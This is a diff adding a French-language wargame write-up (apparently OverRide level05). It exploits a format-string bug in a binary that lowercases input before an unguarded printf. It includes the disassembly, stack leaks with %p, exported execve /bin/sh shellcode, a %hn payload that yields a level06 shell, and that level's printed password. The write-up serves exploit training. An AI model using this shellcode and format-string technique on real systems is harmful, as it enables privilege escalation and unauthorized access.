@@ -1,0 +1,122 @@
+Nous sommes en presence d'un binaire level05 qui attends un argument avec fgets sur l'entree standard et qui va renvoyer la chaine passee en argument avec toutes les majuscules en minuscule
+Desassemblons le programme :
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048444 <+0>:	push   %ebp
+   0x08048445 <+1>:	mov    %esp,%ebp
+   0x08048447 <+3>:	push   %edi
+   0x08048448 <+4>:	push   %ebx
+   0x08048449 <+5>:	and    $0xfffffff0,%esp
+   0x0804844c <+8>:	sub    $0x90,%esp
+   0x08048452 <+14>:	movl   $0x0,0x8c(%esp)
+   0x0804845d <+25>:	mov    0x80497f0,%eax
+   0x08048462 <+30>:	mov    %eax,0x8(%esp)
+   0x08048466 <+34>:	movl   $0x64,0x4(%esp)
+   0x0804846e <+42>:	lea    0x28(%esp),%eax
+   0x08048472 <+46>:	mov    %eax,(%esp)
+   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
+   0x0804847a <+54>:	movl   $0x0,0x8c(%esp)
+   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
+   0x08048487 <+67>:	lea    0x28(%esp),%eax
+   0x0804848b <+71>:	add    0x8c(%esp),%eax
+   0x08048492 <+78>:	movzbl (%eax),%eax
+   0x08048495 <+81>:	cmp    $0x40,%al
+   0x08048497 <+83>:	jle    0x80484cb <main+135>
+   0x08048499 <+85>:	lea    0x28(%esp),%eax
+   0x0804849d <+89>:	add    0x8c(%esp),%eax
+   0x080484a4 <+96>:	movzbl (%eax),%eax
+   0x080484a7 <+99>:	cmp    $0x5a,%al
+   0x080484a9 <+101>:	jg     0x80484cb <main+135>
+   0x080484ab <+103>:	lea    0x28(%esp),%eax
+   0x080484af <+107>:	add    0x8c(%esp),%eax
+   0x080484b6 <+114>:	movzbl (%eax),%eax
+   0x080484b9 <+117>:	mov    %eax,%edx
+   0x080484bb <+119>:	xor    $0x20,%edx
+   0x080484be <+122>:	lea    0x28(%esp),%eax
+   0x080484c2 <+126>:	add    0x8c(%esp),%eax
+   0x080484c9 <+133>:	mov    %dl,(%eax)
+   0x080484cb <+135>:	addl   $0x1,0x8c(%esp)
+   0x080484d3 <+143>:	mov    0x8c(%esp),%ebx
+   0x080484da <+150>:	lea    0x28(%esp),%eax
+   0x080484de <+154>:	movl   $0xffffffff,0x1c(%esp)
+   0x080484e6 <+162>:	mov    %eax,%edx
+   0x080484e8 <+164>:	mov    $0x0,%eax
+   0x080484ed <+169>:	mov    0x1c(%esp),%ecx
+   0x080484f1 <+173>:	mov    %edx,%edi
+   0x080484f3 <+175>:	repnz scas %es:(%edi),%al
+   0x080484f5 <+177>:	mov    %ecx,%eax
+   0x080484f7 <+179>:	not    %eax
+   0x080484f9 <+181>:	sub    $0x1,%eax
+   0x080484fc <+184>:	cmp    %eax,%ebx
+   0x080484fe <+186>:	jb     0x8048487 <main+67>
+   0x08048500 <+188>:	lea    0x28(%esp),%eax
+   0x08048504 <+192>:	mov    %eax,(%esp)
+   0x08048507 <+195>:	call   0x8048340 <printf@plt>
+   0x0804850c <+200>:	movl   $0x0,(%esp)
+   0x08048513 <+207>:	call   0x8048370 <exit@plt>
+End of assembler dump.
+
+Nous voyons un appel a la fonction print qui va prendre notre chaine passee en minuscule pour nous l'afficher.
+Cependant ce printf est mal parametre car en effet lorsque nous passons des %p le printf va nous afficher la stack et ce au dixieme emplacement
+
+./level05 < <(python -c 'print "aaaa" + "%p " * 20')
+aaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd5ff 0xffffd5fe (nil) 0xffffffff 0xffffd684 0xf7fdb000 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
+
+Lorsque nous executons avec un %n nous avons :
+
+./level05 < <(python -c 'print "\x90" * 4 + "%10$n"')
+Segmentation fault (core dumped)
+level05@OverRide:~$ ./level05 < <(python -c 'print "\x90" * 4 + "%10$n"')
+Segmentation fault (core dumped)
+level05@OverRide:~$ dmesg | tail
+[20903.443434] level05[2717]: segfault at 62626262 ip 00000000f7e71bf1 sp 00000000ffffc870 error 6 in libc-2.15.so[f7e2c000+1a0000]
+[21135.760999] level05[2741]: segfault at f7e6aed0 ip 00000000f7e71bf1 sp 00000000ffffc870 error 6 in libc-2.15.so[f7e2c000+1a0000]
+[21205.214737] level05[2746]: segfault at f7e6aed0 ip 00000000f7e71bf1 sp 00000000ffffc850 error 6 in libc-2.15.so[f7e2c000+1a0000]
+[21239.679105] level05[2751]: segfault at f7e5eb70 ip 00000000f7e71bf1 sp 00000000ffffc870 error 7 in libc-2.15.so[f7e2c000+1a0000]
+[21714.116976] level05[2804]: segfault at 90909090 ip 00000000f7e71bf1 sp 00000000ffffc860 error 6 in libc-2.15.so[f7e2c000+1a0000]
+[21746.467856] level05[2809]: segfault at 90909090 ip 00000000f7e71bf1 sp 00000000ffffc860 error 6 in libc-2.15.so[f7e2c000+1a0000]
+[21814.063960] level05[2815]: segfault at 24303125 ip 00000000f7e71bf1 sp 00000000ffffc850 error 6 in libc-2.15.so[f7e2c000+1a0000]
+[21931.749417] level05[2826]: segfault at f7e6aed0 ip 00000000f7e71bf1 sp 00000000ffffc850 error 6 in libc-2.15.so[f7e2c000+1a0000]
+[22084.151526] level05[2833]: segfault at 24303125 ip 00000000f7e71bf1 sp 00000000ffffc870 error 6 in libc-2.15.so[f7e2c000+1a0000]
+[22093.877660] level05[2837]: segfault at 90909090 ip 00000000f7e71bf1 sp 00000000ffffc870 error 6 in libc-2.15.so[f7e2c000+1a0000]
+
+Nous voyons que EIP a ete ecrase par 0x90909090
+
+Le probleme ici reside dans le bout de code  qui met en minuscule les caracteres. En effet pour un caractere compris entre 0x41 et 0x5a ces derniers vont etre decremente de 0x20 
+
+La technique ici va etre de trouver a partir de quelle addresse nous pouvons ecrire sur la stack grace a gdb. ON place un breakpoint juste apres le printf et on analyse : 
+
+(gdb) r < <(python -c 'print "\x90" * 30')
+Starting program: /home/users/level05/level05 < <(python -c 'print "\x90" * 30')
+������������������������������
+
+Breakpoint 1, 0x0804850c in main ()
+(gdb) x/40xw $esp
+0xffffd580:	0xffffd5a8	0x00000064	0xf7fcfac0	0xf7ec3af9
+0xffffd590:	0xffffd5cf	0xffffd5ce	0x00000000	0xffffffff
+0xffffd5a0:	0xffffd654	0x00000000	0x90909090	0x90909090
+0xffffd5b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd5c0:	0x90909090	0x000a9090	0xffffd61c	0xf7fceff4
+0xffffd5d0:	0x08048520	0x080497c8	0x00000001	0x08048321
+0xffffd5e0:	0xf7fcf3e4	0x00000016	0x080497c8	0x08048541
+0xffffd5f0:	0xffffffff	0xf7e5ed56	0xf7fceff4	0xf7e5ede5
+0xffffd600:	0xf7feb620	0x00000000	0x08048529	0x0000001f
+0xffffd610:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513
+
+Nous voyons que les \x90 commencent a partir de 0xffffd5ac
+Nous exportons notre shellcode que nous avons deja utilisé dans les levels precedents : 
+
+export EGG=`python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+
+Nous cherchons son adresse : 0xffffd865 qui equivaut a 4294957157 pour l'ecrire en une seule fois nous allons donc decomposer l'adresse en deux parties et ensuite utiliser %hn pour ecrire 2 bytes au lieu de 4 d'un coup ce qui sera plus simple
+0xffff = 65535 - 8 (nombre de char de l'adresse) = 65527
+0xd865 = 55397 
+Pour cela nous utiliso l'exploit suivant :
+
+python -c 'print "\xae\xd5\xff\xff\xac\xd5\xff\xff" + "%65527d%10$hn%55397d%11$hn"' > /tmp/level05
+cat /tmp/level05 - | ./level05
+
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
